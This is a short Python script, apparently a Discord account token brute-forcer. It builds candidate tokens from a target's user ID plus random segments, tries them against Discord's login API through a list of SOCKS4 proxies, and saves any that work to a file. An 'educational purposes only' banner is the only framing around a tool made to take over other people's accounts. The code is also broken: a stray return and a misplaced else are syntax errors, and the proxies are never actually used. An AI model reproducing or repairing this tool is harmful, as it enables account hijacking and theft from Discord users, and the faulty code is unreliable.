import base64
import os
import random
import string
import requests
import colorama
from colorama import *
import time
userid = base64.b64encode((input("UserID: ")).encode("ascii"))
userid = str(userid)[2:-1]
print("WARNING: Educational purposes only!")
time.sleep(3)

proxies = set()
with open("./proxy/socks4.txt", "r") as file:
    fline = file.readlines()
    for line in fline:
        proxies.add(line.strip())

ts = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_"

while userid == userid:

    def HMAC(chars = string.ascii_uppercase + string.digits, N=27):
        return ''.join(random.choice(chars) for _ in range(N))

    def timest(chars = string.ascii_uppercase + string.digits, N=random.randint(4, 6)):
        return ''.join(random.choice(chars) for _ in range(N))

    token = userid + '.' + timest(chars=ts) + '.' + HMAC(chars=ts)
    
    proxy = {'https': 'socks4://'+random.choice(list(proxies))}

    headers={
    'Authorization': token
    }
    url = 'https://discordapp.com/api/v9/auth/login'
    login = requests.get(url, headers=headers)
    try:
        if login.status_code == 200:
            print(Fore.GREEN + '[+] VALID' + ' ' + token)
            f = open('done.txt', "a+")
            f.write(f'{token}\n')
            break
        elif login.status_code == 429:
            return
            else:
                print(Fore.RED + '[-] INVALID' + ' ' + token)
    finally:
        print("")
input()
